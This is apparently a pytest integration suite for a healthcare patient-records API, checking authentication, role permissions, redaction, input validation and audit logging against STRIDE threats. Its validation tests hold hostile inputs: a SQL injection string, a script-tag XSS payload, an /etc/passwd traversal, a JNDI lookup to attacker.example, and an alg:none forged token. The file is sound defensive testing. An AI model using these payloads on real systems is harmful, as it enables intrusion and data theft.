"""Integration tests against the deployed SecureHealth API.

These are the automated form of the manual curl verification: real HTTP,
real Cognito tokens, real API Gateway authorizer, real KMS and DynamoDB.

Run:
    python get_tokens.py              # writes tokens to the environment file
    source .test-env                  # Git Bash / macOS / Linux
    pytest tests/test_integration.py -v

Skipped automatically when the token environment variables are absent, so the
unit suite still runs in CI without AWS credentials.
"""
import uuid

import pytest
import requests
import random
import string

pytestmark = pytest.mark.integration

TIMEOUT = 20


def auth(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def new_patient_payload(**overrides):
    payload = {
        "first_name": "Test",
        "last_name": "Case" + "".join(random.choices(string.ascii_lowercase, k=6)),        "date_of_birth": "1990-06-15",
        "health_card": "5550001111",
        "email": "test.case@example.ca",
        "phone": "4165550000",
        "clinical_notes": "Integration test record.",
        "allergies": "none known",
    }
    payload.update(overrides)
    return payload


@pytest.fixture(scope="module")
def created_patient(api_url, admin_token):
    res = requests.post(f"{api_url}/patients", headers=auth(admin_token),
                        json=new_patient_payload(), timeout=TIMEOUT)
    assert res.status_code == 201, res.text
    return res.json()["patient"]


# ----------------------------------------------------------- authentication -
@pytest.mark.stride("Spoofing")
def test_unauthenticated_request_is_rejected(api_url):
    res = requests.get(f"{api_url}/health", timeout=TIMEOUT)
    assert res.status_code == 401


@pytest.mark.stride("Spoofing")
@pytest.mark.parametrize("token", [
    "not-a-token",
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",          # alg:none forgery attempt
    "Bearer",
    "a.b.c",
])
def test_forged_tokens_are_rejected(api_url, token):
    res = requests.get(f"{api_url}/health", headers=auth(token), timeout=TIMEOUT)
    assert res.status_code in (401, 403)


@pytest.mark.stride("Spoofing")
def test_valid_token_returns_role(api_url, admin_token):
    res = requests.get(f"{api_url}/health", headers=auth(admin_token), timeout=TIMEOUT)
    assert res.status_code == 200
    assert res.json()["role"] == "Admin"


@pytest.mark.stride("Information Disclosure")
def test_security_headers_present(api_url, admin_token):
    res = requests.get(f"{api_url}/health", headers=auth(admin_token), timeout=TIMEOUT)
    assert res.headers.get("Strict-Transport-Security")
    assert res.headers.get("X-Content-Type-Options") == "nosniff"
    assert res.headers.get("X-Frame-Options") == "DENY"


@pytest.mark.stride("Information Disclosure")
def test_transport_is_https_only(api_url):
    assert api_url.startswith("https://")


# ------------------------------------------------------------------- RBAC --
@pytest.mark.stride("Elevation of Privilege")
def test_receptionist_cannot_create_patient(api_url, reception_token):
    res = requests.post(f"{api_url}/patients", headers=auth(reception_token),
                        json=new_patient_payload(), timeout=TIMEOUT)
    assert res.status_code == 403
    assert res.json()["error"] == "forbidden"


@pytest.mark.stride("Elevation of Privilege")
def test_receptionist_cannot_update_patient(api_url, reception_token, created_patient):
    res = requests.put(f"{api_url}/patients/{created_patient['patient_id']}",
                       headers=auth(reception_token), json={"phone": "4165559999"},
                       timeout=TIMEOUT)
    assert res.status_code == 403


@pytest.mark.stride("Elevation of Privilege")
def test_doctor_cannot_read_audit_log(api_url, doctor_token):
    res = requests.get(f"{api_url}/audit?limit=5", headers=auth(doctor_token), timeout=TIMEOUT)
    assert res.status_code == 403


@pytest.mark.stride("Elevation of Privilege")
def test_receptionist_cannot_read_audit_log(api_url, reception_token):
    res = requests.get(f"{api_url}/audit?limit=5", headers=auth(reception_token), timeout=TIMEOUT)
    assert res.status_code == 403


@pytest.mark.stride("Elevation of Privilege")
def test_admin_can_read_audit_log(api_url, admin_token):
    res = requests.get(f"{api_url}/audit?limit=5", headers=auth(admin_token), timeout=TIMEOUT)
    assert res.status_code == 200
    assert "events" in res.json()


# --------------------------------------------------------------- redaction --
@pytest.mark.stride("Information Disclosure")
def test_receptionist_sees_redacted_clinical_fields(api_url, reception_token, created_patient):
    res = requests.get(f"{api_url}/patients/{created_patient['patient_id']}",
                       headers=auth(reception_token), timeout=TIMEOUT)
    assert res.status_code == 200
    patient = res.json()["patient"]
    assert patient["clinical_notes"] == "[REDACTED]"
    assert patient["allergies"] == "[REDACTED]"
    assert patient["last_name"] == created_patient["last_name"]   # demographics visible


@pytest.mark.stride("Information Disclosure")
def test_doctor_sees_full_record(api_url, doctor_token, created_patient):
    res = requests.get(f"{api_url}/patients/{created_patient['patient_id']}",
                       headers=auth(doctor_token), timeout=TIMEOUT)
    assert res.status_code == 200
    assert res.json()["patient"]["clinical_notes"] == "Integration test record."


# -------------------------------------------------------------- validation --
@pytest.mark.stride("Tampering")
@pytest.mark.parametrize("payload", [
    "Robert'); DROP TABLE patients;--",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "${jndi:ldap://attacker.example/x}",
])
def test_injection_payloads_rejected(api_url, admin_token, payload):
    res = requests.post(f"{api_url}/patients", headers=auth(admin_token),
                        json=new_patient_payload(first_name=payload), timeout=TIMEOUT)
    assert res.status_code == 400
    assert payload not in res.text          # no reflection of the payload


@pytest.mark.stride("Elevation of Privilege")
def test_mass_assignment_rejected(api_url, admin_token):
    body = new_patient_payload()
    body["is_admin"] = True
    res = requests.post(f"{api_url}/patients", headers=auth(admin_token),
                        json=body, timeout=TIMEOUT)
    assert res.status_code == 400


@pytest.mark.stride("Tampering")
def test_invalid_health_card_rejected(api_url, admin_token):
    res = requests.post(f"{api_url}/patients", headers=auth(admin_token),
                        json=new_patient_payload(health_card="123"), timeout=TIMEOUT)
    assert res.status_code == 400


@pytest.mark.stride("Tampering")
def test_future_date_of_birth_rejected(api_url, admin_token):
    res = requests.post(f"{api_url}/patients", headers=auth(admin_token),
                        json=new_patient_payload(date_of_birth="2099-01-01"), timeout=TIMEOUT)
    assert res.status_code == 400


@pytest.mark.stride("Tampering")
def test_path_traversal_id_rejected(api_url, admin_token):
    res = requests.get(f"{api_url}/patients/not-a-uuid",
                       headers=auth(admin_token), timeout=TIMEOUT)
    assert res.status_code == 400


@pytest.mark.stride("Information Disclosure")
def test_errors_do_not_leak_internals(api_url, admin_token):
    res = requests.get(f"{api_url}/patients/not-a-uuid",
                       headers=auth(admin_token), timeout=TIMEOUT)
    text = res.text.lower()
    for leak in ("traceback", "boto", "dynamodb", "arn:aws", "/var/task"):
        assert leak not in text


# ------------------------------------------------------------------- CRUD --
@pytest.mark.stride("Tampering")
def test_create_and_read_roundtrip(api_url, admin_token):
    payload = new_patient_payload(clinical_notes="Roundtrip check.")
    created = requests.post(f"{api_url}/patients", headers=auth(admin_token),
                            json=payload, timeout=TIMEOUT)
    assert created.status_code == 201
    pid = created.json()["patient"]["patient_id"]

    read = requests.get(f"{api_url}/patients/{pid}", headers=auth(admin_token), timeout=TIMEOUT)
    assert read.status_code == 200
    assert read.json()["patient"]["clinical_notes"] == "Roundtrip check."


@pytest.mark.stride("Tampering")
def test_update_persists_and_reverifies(api_url, doctor_token, created_patient):
    pid = created_patient["patient_id"]
    res = requests.put(f"{api_url}/patients/{pid}", headers=auth(doctor_token),
                       json={"clinical_notes": "Dosage adjusted to 10mg."}, timeout=TIMEOUT)
    assert res.status_code == 200

    read = requests.get(f"{api_url}/patients/{pid}", headers=auth(doctor_token), timeout=TIMEOUT)
    assert read.json()["patient"]["clinical_notes"] == "Dosage adjusted to 10mg."


@pytest.mark.stride("Information Disclosure")
def test_search_returns_results(api_url, admin_token, created_patient):
    res = requests.get(f"{api_url}/patients?q={created_patient['last_name']}",
                       headers=auth(admin_token), timeout=TIMEOUT)
    assert res.status_code == 200
    assert res.json()["count"] >= 1


# ------------------------------------------------------------------ audit --
@pytest.mark.stride("Repudiation")
def test_actions_appear_in_audit_log(api_url, admin_token, created_patient):
    requests.get(f"{api_url}/patients/{created_patient['patient_id']}",
                 headers=auth(admin_token), timeout=TIMEOUT)
    res = requests.get(f"{api_url}/audit?limit=50", headers=auth(admin_token), timeout=TIMEOUT)
    actions = [e["action"] for e in res.json()["events"]]
    assert "PATIENT_READ" in actions
    assert "PATIENT_CREATE" in actions


@pytest.mark.stride("Repudiation")
def test_denied_attempts_appear_in_audit_log(api_url, admin_token, reception_token):
    requests.post(f"{api_url}/patients", headers=auth(reception_token),
                  json=new_patient_payload(), timeout=TIMEOUT)
    res = requests.get(f"{api_url}/audit?limit=50", headers=auth(admin_token), timeout=TIMEOUT)
    outcomes = [e["outcome"] for e in res.json()["events"]]
    assert any(o.startswith("DENIED") for o in outcomes)


@pytest.mark.stride("Repudiation")
def test_validation_rejections_are_audited(api_url, admin_token):
    requests.post(f"{api_url}/patients", headers=auth(admin_token),
                  json=new_patient_payload(health_card="bad"), timeout=TIMEOUT)
    res = requests.get(f"{api_url}/audit?limit=50", headers=auth(admin_token), timeout=TIMEOUT)
    actions = [e["action"] for e in res.json()["events"]]
    assert "VALIDATION_REJECT" in actions
